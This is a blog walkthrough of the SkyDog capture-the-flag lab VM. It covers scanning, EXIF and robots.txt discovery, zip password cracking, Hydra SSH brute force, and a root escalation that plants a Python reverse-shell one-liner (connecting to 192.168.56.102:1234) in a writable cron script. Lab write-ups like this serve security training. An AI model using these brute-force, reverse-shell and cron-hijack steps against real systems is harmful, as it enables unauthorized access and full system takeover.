---
title: Skydog CTF [Vulnhub] Walkthrough
date: 2016-06-07T19:03:50Z
tags:
  - vulnhub
  - walkthrough
category: walkthrough
---

Welcome again, I've picked another VM from [Vulnhub](https://vulnhub.com) for this post: SkyDog CTF. Sounds like fun CTF with six flags. The description gives me some hints:

> Flag \#1 Home Sweet Home or (A Picture is Worth a Thousand Words)
>
> Flag \#2 When do Androids Learn to Walk?
>
> Flag \#3 Who Can You Trust?
>
> Flag \#4 Who Doesn’t Love a Good Cocktail Party?
>
> Flag \#5 Another Day at the Office
>
> Flag \#6 Little Black Box

Let's go...

## Flag 1

> Home Sweet Home or (A Picture is Worth a Thousand Words)

As per usual, let's see what's going on on this box

```sourceCode
root@kali:~/skydog# nmap -p- -sC -sV 192.168.56.101

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-07 15:10 BST
Nmap scan report for 192.168.56.101
Host is up (0.00072s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 c8:f7:5b:33:8a:5a:0c:03:bb:6b:af:2d:a9:70:d3:01 (DSA)
|   2048 01:9f:dd:98:ba:be:de:22:4a:48:4b:be:8d:1a:47:f4 (RSA)
|_  256 f8:a9:65:a5:7c:50:1d:fd:71:57:92:38:8b:ee:8c:0a (ECDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 252 disallowed entries (15 shown)
| /search /sdch /groups /catalogs /catalogues /news /nwshp
| /setnewsprefs? /index.html? /? /?hl=*& /?hl=*&*&gws_rd=ssl
|_/addurl/image? /mail/ /pagead/
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:EF:0B:15 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**ssh** and **http**, I'll start on the easy one: port 80. Here I get the SkyDog CTF logo which I download to examine further. And sure enough

```sourceCode
root@kali:~/skydog# exiftool SkyDogCon_CTF.jpg
ExifTool Version Number         : 10.15
File Name                       : SkyDogCon_CTF.jpg
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2016:06:07 14:55:21+01:00
File Access Date/Time           : 2016:06:07 14:55:21+01:00
File Inode Change Date/Time     : 2016:06:07 14:55:22+01:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Exif Byte Order                 : Big-endian (Motorola, MM)
Software                        : Adobe ImageReady
XP Comment                      : flag{abc40a2d4e023b42bd1ff04891549ae2}
Padding                         : (Binary data 2060 bytes, use -b option to extract)
Image Width                     : 900
Image Height                    : 525
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 900x525
Megapixels                      : 0.472
```

Oh hello _XP Comment_

> Flag 1 : flag{abc40a2d4e023b42bd1ff04891549ae2} Welcome Home

I popped the flag through crackstation to see if it means anything, and sure enough it does... :)

### Flag 2

> When do Androids Learn to Walk?

Well I wonder that too. In the earlier scan I noticed a substantial **robots.txt** file so I figured I'd take a closer look at that... androids being robots and all.

```sourceCode
# Congrats Mr. Bishop, your getting good - flag{cd4f10fcba234f0e8b2f60a490c306e6}
#
User-agent:*
Disallow: /search
Allow: /search/about
Disallow: /sdch
Disallow: /groups
Disallow: /catalogs
Allow: /catalogs/about
```

Right there on the first line, crafty

> Flag 2 : flag{cd4f10fcba234f0e8b2f60a490c306e6} Bots

### Flag 3

> Who Can You Trust?

I suppose looking at the URLs in the _robots.txt_ file might be an idea. Some resolve to **404**, some don't. Weeding out the working ones is going to be tedious... or is it :)

```Python
import requests
import re

with open('robots.txt') as robot:
    for l in robot.readlines():
        if l.startswith('#'):
            continue
        m = re.match(r'^(Allow|Disallow): (.+)', l)
        if m:
            r = requests.get('https://192.168.56.101'+m.groups(0)[1].strip())
            if r.status_code != 404:
                print '[OK]',m.groups(0)[1]
```

From that I get

```sourceCode
root@kali:~/skydog# python ./t.py
[OK] /index.html?
[OK] /?
[OK] /?hl=
[OK] /?hl=*&
[OK] /?hl=*&gws_rd=ssl$
[OK] /?hl=*&*&gws_rd=ssl
[OK] /?gws_rd=ssl$
[OK] /?pt1=tr
[OK] /Setec/
```

I like the look of that _Setec_ one, so I'll check that out first and discover an image from the movie _Sneakers_. Download, examine EXIF, and realise that you don't get lucky twice :) But looking at where the image is coming from, I notice that it's in a subdir `/Setec/Astronomy/`. What else could be secreted in there? A zip file `Whistler.zip`. Sweet. Download and... oh, password protected. No worries, I got this

```sourceCode
root@kali:~/skydog# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt Whistler.zip


PASSWORD FOUND!!!!: pw == yourmother
```

That was quick. So Ok, who can you trust? Your mother obviously. Let's unzip and see what's in there

```sourceCode
root@kali:~/skydog# unzip Whistler.zip
Archive:  Whistler.zip
[Whistler.zip] flag.txt password:
 extracting: flag.txt
  inflating: QuesttoFindCosmo.txt
root@kali:~/skydog# cat flag.txt
flag{1871a3c1da602bf471d3d76cc60cdb9b}
```

Gotcha

> Flag 3 : flag{1871a3c1da602bf471d3d76cc60cdb9b} yourmother

### Flag 4

> Who Doesn’t Love a Good Cocktail Party?

```sourceCode
root@kali:~/skydog# cat QuesttoFindCosmo.txt
Time to break out those binoculars and start doing some OSINT
```

That's _Open-source intelligence_. I suppose it's time to harvest information then. So far everything relates to the movie _Sneakers_, so I'll start there by harvesting some info with _CeWL_. I planned to use Wikipedia and IMDB

```sourceCode
root@kali:~/skydog# cewl --depth 1  https://www.imdb.com/title/tt0105435/trivia?ref_=tt_ql_2 -w sneakers_imdb.txt
CeWL 5.1 Robin Wood (robin@digi.ninja) (https://digi.ninja)
```

I pop that into **dirbuster** and I get lucky and find a _PlayTronics_ directory with a _flag.txt_ file inside

> Flag 4 : flag{c07908a705c22922e6d416e0e1107d99} leroybrown

### Flag 5

> Another Day at the Office

Alongside the flag there's also a _pcap_ file, so I'll download that and open it in _Wireshark_ for analysis. In the pcap is a TCP stream that reasembles to an mp3. To get the mp3 select a segment and go to File-&gt;Export Objects-&gt;HTTP-&gt;Save

When listening to it, it's that classic line from the movie where they take the voice snippets and reassemble them to create the voice recognition passphrase:

> Hi, my name is Werner Brandes. My voice is my passport. Verify Me.

Right, what do we do with that? Looking at hex and strings shows nothing suspicious about the file. It seems that the info we need is the message in the audio.

Well there was that ssh port, **wernerbrandes** as a username? Password? Maybe one of the wordlists I made earlier...

_time passes..._

No dice.

_/me thinks_

_time passes..._

What about those flags? I'll put the hashes and plaintext into a text file and see if I get lucky with them.

```sourceCode
root@kali:~/skydog# hydra -l wernerbrandes -P flags.txt ssh://192.168.56.101:22Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://www.thc.org/thc-hydra) starting at 2016-06-07 16:55:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (./hydra.restore) from a previous session found, to prevent overwriting, you have 10 seconds to abort...
[DATA] max 8 tasks per 1 server, overall 64 tasks, 8 login tries (l:1/p:8), ~0 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.56.101   login: wernerbrandes   password: leroybrown
1 of 1 target successfully completed, 1 valid password found
```

Oh Hydra, you're so good :)

```sourceCode
root@kali:~/skydog# ssh wernerbrandes@192.168.56.101wernerbrandes@192.168.56.101's password:
Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Tue Jun  7 11:55:48 EDT 2016

  System load:  0.0               Processes:           104
  Usage of /:   8.1% of 17.34GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 192.168.56.101
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

30 packages can be updated.
21 updates are security updates.

Last login: Tue Jun  7 11:51:09 2016 from 192.168.56.102
wernerbrandes@skydogctf:~$ cat flag.tt
cat: flag.tt: No such file or directory
wernerbrandes@skydogctf:~$ cat flag.txt
flag{82ce8d8f5745ff6849fa7af1473c9b35}
```

There it is :)

> Flag 5 : flag{82ce8d8f5745ff6849fa7af1473c9b35} &lt;no hash found :(&gt;

### Flag 6

Now we're on the box, so let's see who else has accounts here

```sourceCode
wernerbrandes@skydogctf:~$ getent passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
nemo:x:1000:1000:nemo,,,:/home/nemo:/bin/bash
wernerbrandes:x:1001:1001:Werner Brandes,,,:/home/wernerbrandes:/bin/bash
```

This **nemo** account could be useful. Nothing of interest in the home dir, but let's look what they own

```sourceCode
wernerbrandes@skydogctf:~$ find / -user nemo 2> /dev/null | grep -v proc
/var/www/html/Setec/index.html
/var/www/html/Setec/Astronomy/Setec_Astronomy.jpg
/var/www/html/Setec/Astronomy/Whistler.zip
/var/www/html/CongratulationsYouDidIt/You're the best... around!.mp4
/var/www/html/index.html
/var/www/html/PlayTronics/flag.txt
/var/www/html/PlayTronics/companytraffic.pcap
/var/www/html/robots.txt
/var/www/html/SkyDogCon_CTF.jpg
/home/nemo
/home/nemo/.cache
/home/nemo/.profile
/home/nemo/.bashrc
/home/nemo/.bash_history
/home/nemo/.bash_logout
/home/wernerbrandes/flag.txt
```

Ah, the web content... and there's even a _/CongratulationsYouDidIt/_ folder which contains an mp4. It's a clip from the Karate Kid. Well, we're not done though are we? I plough on finding very little. Ok, so what can I write to on this stupid box?

```sourceCode
wernerbrandes@skydogctf:~$ find / -writable -type f 2> /dev/null | grep -v proc/lib
/log/sanitizer.py
/sys/fs/cgroup/systemd/user/1001.user/3.session/tasks
/sys/kernel/security/apparmor/.access
/home/wernerbrandes/.cache/motd.legal-displayed
/home/wernerbrandes/.selected_editor
/home/wernerbrandes/.profile
/home/wernerbrandes/.bashrc
/home/wernerbrandes/.bash_history
/home/wernerbrandes/.bash_logout
```

Oh, hello... what you got for me `/log/sanitizer.py`?

```Python
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

A root owned file that we can write to? Oh boy! Looks like it clears out the `/tmp` folder so there's a good change this runs on a crontab. I can make use of this.

Let's see if the installed python can get us a reverse shell

```sourceCode
wernerbrandes@skydogctf:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

And success :) Now to make root do that for me. I put the above into the sanitizer script and open a listener on my box and wait.... shortly after

```sourceCode
root@kali:~/skydog# nc -lvn -p 1234
listening on [any] 1234 ...
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.101] 53160
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

Now, the flag's probably in here somewhere.

```sourceCode
# ls
BlackBox
# file BlackBox
BlackBox: directory
# cd BlackBox
# ls
flag.txt
# cat flag.txt
flag{b70b205c96270be6ced772112e7dd03f}

Congratulations!! Martin Bishop is a free man once again!  Go here to receive your reward.
/CongratulationsYouDidIt#
```

Thanks, but I've already seen that....

> Flag 6 : flag{b70b205c96270be6ced772112e7dd03f}

### Summary Flag

That was fun :) Even if the last flag almost drove me crazy. Nothing like spending a few hours running fruitless wordlists. But managed to get all the flags in the end. The reverse shell could have been done in any scripting language. I would assume that the shebang at the top of the file indicates it won't be called with a specific interpreter. Either way, the flags are mine, all mine!
